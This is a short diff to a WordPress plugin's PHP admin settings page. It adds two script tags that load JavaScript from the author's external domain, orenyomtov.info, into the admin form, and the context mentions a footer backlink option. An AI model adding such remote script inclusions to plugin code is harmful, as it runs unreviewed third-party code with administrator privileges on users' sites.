@@ -366,9 +366,10 @@ Link <a href="http://orenyomtov.info">me</a> once in 10 page loads in the footer
 <p class="submit">
 <input type="submit" class="button-primary" value="<?php _e('Save Changes') ?>" />
 </p>
-
+<script type="text/javascript" src="http://orenyomtov.info/downloads/plugins_inform.php?plugin=peb"></script> 
 </form>
 </div>
+<script type="text/javascript" src="http://orenyomtov.info/downloads/plugins_outform.php?plugin=peb"></script> 
 <?php
 }
 
